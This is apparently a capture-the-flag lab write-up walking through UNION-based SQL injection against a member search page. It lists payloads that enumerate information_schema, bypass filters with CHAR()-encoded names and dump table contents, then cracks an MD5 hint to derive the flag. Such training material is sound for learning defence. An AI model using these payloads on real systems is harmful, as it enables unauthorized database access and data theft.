# SQL Injection - Database Enumeration

## Discovery Process

1. Identify a page with database queries (e.g., member search/lookup)
2. Notice URL parameters that might be vulnerable to SQL injection
3. Test for SQL injection vulnerability

## Vulnerability Details

- **Issue**: User input is not properly sanitized before being used in SQL queries
- **Attack vector**: SQL injection using UNION-based queries
- **Database**: MySQL/MariaDB with information_schema access

## Exploitation

### Step 1: List all tables in the database
```sql
1 UNION SELECT table_name, table_schema FROM information_schema.tables
```

Here we noticed a table named `list_images` with a title `Member_images`

### Step 2: List columns from tables

Using CHAR() to bypass filters (ASCII codes for "list_images"):
```sql
1 UNION SELECT column_name, column_type FROM information_schema.columns WHERE table_name=CHAR(108,105,115,116,95,105,109,97,103,101,115)
```

This reveals the columns: `id`, `url`, `title`, `comment`

### Step 3: Extract data from the users table

Now that we know the table name and columns, extract the actual values (column `one` cannot be queried):
```sql
1 UNION SELECT id, url FROM list_images
1 UNION SELECT title, comment FROM list_images
```

Found the flag hint in the query:
```sql
1 UNION SELECT title, commment FROM list_images
```

**Response:**
```
ID: 1 UNION SELECT title, comment FROM list_images
Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
Url : Hack me ?
```

### Step 4: Decrypt and hash the password

1. **Decrypt the MD5 hash** using [CrackStation](https://crackstation.net/):
   - Input: `1928e8083cf461a51303633093573c46`
   - Output: `albatroz`

2. **Convert to lowercase**: `albatroz`

3. **Generate SHA-256 hash** of `albatroz` using [SHA256 Online Tool](https://emn178.github.io/online-tools/sha256.html):
   ```
   f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
   ```

4. Successfully obtained the flag

### Step 5: Validate flag

- Submit the SHA-256 hash as the flag
- Successfully obtained the flag
